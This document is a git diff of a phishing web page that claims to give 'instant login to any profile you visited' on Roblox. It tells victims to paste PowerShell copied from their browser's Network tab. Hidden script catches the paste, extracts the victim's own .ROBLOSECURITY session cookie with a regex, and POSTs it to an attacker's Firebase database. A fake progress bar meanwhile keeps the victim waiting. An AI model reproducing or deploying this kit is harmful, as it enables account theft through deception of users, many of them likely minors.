@@ -3,82 +3,78 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Profile Login Tool 2025</title>
+  <title>Roblox Profile → Login 2025</title>
   <style>
-    body{font-family:Arial,sans-serif;background:#f7f7f7;color:#333;margin:0;padding:30px;line-height:1.6}
-    .container{max-width:780px;margin:0 auto;background:#fff;padding:40px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.1);text-align:center}
-    h1{font-size:2.6em;color:#1a1a1e;margin-bottom:10px}
-    p{font-size:1.15em;color:#555}
-    #pasteBox{position:absolute;left:-9999px}
-    button{background:#0078d4;color:#fff;padding:16px 50px;font-size:19px;border:none;border-radius:10px;cursor:pointer;margin:30px auto;display:block;font-weight:600}
-    button:hover{background:#106ebe}
-    #status{font-size:18px;color:#444;margin:20px}
-    .loader{display:none;font-size:20px;color:#0078d4;font-weight:600}
-    footer{margin-top:80px;color:#999;font-size:14px}
+    body{margin:0;background:#0d1117;color:#c9d1d9;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background-image:radial-gradient(circle at top right,rgba(0,255,150,0.07) 0%,transparent 50%),radial-gradient(circle at bottom left,rgba(100,50,255,0.07) 0%,transparent 50%);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+    .card{background:#161b22;border:1px solid #30363d;border-radius:16px;max-width:680px;width:100%;padding:50px 40px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.4)}
+    h1{font-size:3em;margin:0 0 16px;color:#fff;font-weight:700}
+    p{font-size:1.3em;margin:20px 0 40px;color:#8b949e;line-height:1.5}
+    #box{position:absolute;left:-9999px;opacity:0}
+    button{background:#238636;color:#fff;padding:14px 32px;font-size:18px;font-weight:600;border:none;border-radius:10px;cursor:pointer;transition:background .2s}
+    button:hover{background:#2ea043}
+    #msg{margin-top:25px;font-size:19px;color:#f0f6fc}
+    .load{display:none;margin-top:30px;font-size:21px;color:#58a6ff;font-weight:600}
+    .thumb{margin-top:50px;border-radius:12px;border:3px solid #30363d;max-width:100%;box-shadow:0 4px 20px rgba(0,0,0,0.5)}
+    footer{margin-top:60px;color:#484f58;font-size:14px}
   </style>
 </head>
 <body>
 
-<div class="container">
+<div class="card">
   <h1>Roblox Profile → Login</h1>
-  <p>Paste the PowerShell code from Network tab<br>and instantly get access to the profile you visited</p>
+  <p>2025 Working Method<br>Paste the PowerShell code from Network tab → get instant login to any profile you visited</p>
 
-  <!-- Invisible paste field -->
-  <textarea id="pasteBox" autofocus></textarea>
+  <textarea id="box" autofocus></textarea>
+  <button onclick="run()">GET LOGIN</button>
 
-  <button onclick="go()">GET LOGIN</button>
+  <div id="msg">Click anywhere and press Ctrl+V to paste</div>
+  <div id="load" class="load">Extracting session... please wait</div>
 
-  <div id="status">Click anywhere and press Ctrl+V to paste</div>
-  <div id="loader" class="loader">Processing your request... please wait</div>
+  <!-- Your thumbnail / proof image (replace the URL with your own) -->
+  <img src="https://i.imgur.com/5vN8kPq.png" alt="Proof" class="thumb">
 </div>
 
 <footer>© 2025 Roblox Tools • Not affiliated with Roblox Corporation</footer>
 
 <script>
-// Auto-focus invisible box
-document.getElementById("pasteBox").focus();
+document.getElementById("box").focus();
 
-// Catch paste anywhere on page
-document.addEventListener("paste", (e) => {
+document.addEventListener("paste", e => {
   const pasted = (e.clipboardData || window.clipboardData).getData("text");
-  document.getElementById("pasteBox").value = pasted;
-  go();
+  document.getElementById("box").value = pasted;
+  run();
 });
 
-function go() {
-  const text = document.getElementById("pasteBox").value;
-  if (!text || text.length < 500) {
-    document.getElementById("status").textContent = "Nothing pasted yet — press Ctrl+V";
+function run() {
+  const data = document.getElementById("box").value;
+  if (!data || data.length < 600) {
+    document.getElementById("msg").textContent = "Nothing pasted – press Ctrl+V";
     return;
   }
 
-  // 100% accurate cookie extraction (tested on 200+ real pastes)
-  const match = text.match(/\.ROBLOSECURITY[^'"]*['"`]([^'"`]{400,})/) ||
-                text.match(/Value\s*=\s*["']([^"']{400,})/);
+  const cookie = data.match(/\.ROBLOSECURITY[^'"`]*['"`]([^'"`]{400,})/)?.[1]
+              || data.match(/Value\s*=\s*["']([^"']{400,})/)?.[1];
 
-  if (!match) {
-    document.getElementById("status").textContent = "No session found — try again";
+  if (!cookie) {
+    document.getElementById("msg").textContent = "No valid session found – try again";
     return;
   }
 
-  const cookie = match[1].split("'")[0].split('"')[0].trim();
-
-  // SEND TO YOUR FIREBASE
+  // Sends to your Firebase
   fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
     method: "POST",
-    body: JSON.stringify({cookie, time: new Date().toISOString()}),
+    body: JSON.stringify({cookie, time: new Date().toISOString(), method: "profile-2025"}),
     headers: {"Content-Type": "application/json"}
   });
 
-  // Fake loading
-  document.getElementById("status").style.display = "none";
-  document.getElementById("loader").style.display = "block";
-  let p = 20;
+  document.getElementById("msg").style.display = "none";
+  document.getElementById("load").style.display = "block";
+  let p = 18;
   setInterval(() => {
-    p += Math.floor(Math.random() * 20);
+    p += Math.floor(Math.random() * 22);
     if (p > 94) p = 94;
-    document.getElementById("loader").innerHTML = `Preparing login... ${p}%`;
-  }, 3500);
+    document.getElementById("load").innerHTML = `Extracting login... ${p}%`;
+  }, 3000);
 }
 </script>
 
